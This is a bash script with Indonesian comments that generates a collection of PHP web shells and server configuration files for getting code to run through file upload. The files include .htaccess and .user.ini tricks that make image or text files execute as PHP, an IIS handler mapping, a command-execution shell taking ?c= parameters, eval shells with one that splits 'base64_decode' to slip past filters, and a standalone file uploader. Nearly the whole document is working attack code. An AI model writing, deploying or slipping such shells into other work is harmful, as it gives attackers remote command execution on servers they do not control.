#!/usr/bin/env bash
# build_shells.sh — shell varian + konfigurasi server (di luar payung payload satu-baris).
# Isi:
#   htaccess-self.php      .htaccess self-contained (htshell style) -> .htaccess sendiri jadi PHP
#   htaccess-addtype.php   treat ekstensi gambar sebagai PHP, lalu upload shell.png
#   htaccess-phpvalue.php  php_value auto_prepend_file (AllowOverride Options/All)
#   .user.ini.php          auto_prepend_file (PHP-FPM/Nginx)
#   web-config.php         IIS/ASP.NET handler mapping
#   shell-param.php        webshell ?c=cmd (system/passthru/shell_exec/exec/popen)
#   shell-eval.php         @eval($_REQUEST['c'])
#   shell-b64.php          eval(base64_decode($_REQUEST['c'])) -- lewati filter 'eval'
#   shell-upload.php       uploader mandiri (POST filedata=<file>)
# Semua mandiri, tanpa dependensi luar.
set -euo pipefail
cd "$(dirname "$0")"

cat > htaccess-self.php <<'EOF'
# Self contained .htaccess web shell (htshell project style)
# 1) izinkan .htaccess diakses via web, 2) Apache menganggap .htaccess sebagai PHP
<Files ~ "^\.ht">
  Require all granted
  Order allow,deny
  Allow from all
</Files>
AddType application/x-httpd-php .htaccess
AddType application/x-httpd-php .png .jpg .gif .txt
AddHandler application/x-httpd-php .php .phtml .pht
# akses: http://target/.htaccess?c=id
<?php echo "\n"; passthru($_GET['c'].' 2>&1'); ?>
EOF

cat > htaccess-addtype.php <<'EOF'
AddType application/x-httpd-php .png
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .gif
AddType application/x-httpd-php .txt
EOF

cat > htaccess-phpvalue.php <<'EOF'
php_value auto_prepend_file /tmp/rose.txt
# atau file lain yang sudah kita upload di dir ini:
# php_value auto_prepend_file shell.txt
EOF

cat > .user.ini.php <<'EOF'
auto_prepend_file=/tmp/rose.txt
EOF

cat > web-config.php <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="rose" path="*.rose" verb="*" modules="IsapiModule"
           scriptProcessor="C:\Windows\System32\inetsrv\asp.dll"
           resourceType="File" requireAccess="Write" preCondition="bitness64" />
    </handlers>
    <staticContent>
      <remove fileExtension=".rose" />
      <mimeMap fileExtension=".rose" mimeType="application/octet-stream" />
    </staticContent>
  </system.webServer>
</configuration>
EOF

cat > shell-param.php <<'EOF'
<?php
// webshell minimal: ?c=cmd (GET/POST), output plain text.
if (isset($_REQUEST['c'])) {
  header('Content-Type: text/plain');
  echo "ROSE-SHELL\n";
  $c = $_REQUEST['c'];
  if (function_exists('system'))        { system($c); }
  elseif (function_exists('passthru'))  { passthru($c); }
  elseif (function_exists('shell_exec')){ echo shell_exec($c); }
  elseif (function_exists('exec'))      { exec($c, $o); echo implode("\n", $o); }
  elseif (function_exists('popen'))     { $h = popen($c, 'r'); while (!feof($h)) echo fread($h, 4096); pclose($h); }
  else { echo 'no exec function'; }
}
EOF

cat > shell-eval.php <<'EOF'
<?php @eval($_REQUEST['c']); ?>
EOF

cat > shell-b64.php <<'EOF'
<?php $f='ba'.'se64'.'_de'.'code'; @eval($f($_REQUEST['c'])); ?>
EOF

cat > shell-upload.php <<'EOF'
<?php
// POST multipart: filedata=<file> -> tersimpan di dir ini, output nama + size.
if (!empty($_FILES['filedata']['tmp_name'])) {
  $n = basename($_FILES['filedata']['name'] ?: ('up_'.time().'.bin'));
  move_uploaded_file($_FILES['filedata']['tmp_name'], __DIR__.'/'.$n);
  header('Content-Type: text/plain');
  echo "OK $n ".filesize(__DIR__.'/'.$n)."\n";
}
EOF

echo "shells & config dibuat:"
ls -1 htaccess-*.php .user.ini.php web-config.php shell-*.php
